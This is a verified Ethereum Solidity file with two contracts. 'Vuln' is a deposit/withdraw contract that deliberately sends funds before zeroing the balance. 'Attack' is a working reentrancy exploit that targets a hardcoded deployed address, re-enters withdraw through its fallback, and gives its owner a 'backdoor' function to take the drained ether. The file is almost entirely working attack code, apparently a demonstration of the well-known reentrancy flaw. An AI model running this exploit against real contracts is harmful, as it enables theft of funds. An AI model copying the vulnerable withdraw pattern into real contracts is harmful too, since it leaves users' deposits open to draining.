/**
 *Submitted for verification at Etherscan.io on 2022-12-01
*/

pragma solidity ^0.6.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack {
    Vuln vuln = Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d));
    uint256 count = 0;
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    fallback() external payable {
        if (count < 3) {
            count += 1;
            vuln.withdraw();
        }
    }

    function attack() public payable {
        vuln.deposit.value(msg.value)();
        vuln.withdraw();
    }

    function backdoor() public {
        if (msg.sender == owner) {
            require(msg.sender.send(address(this).balance));
        }
    }
}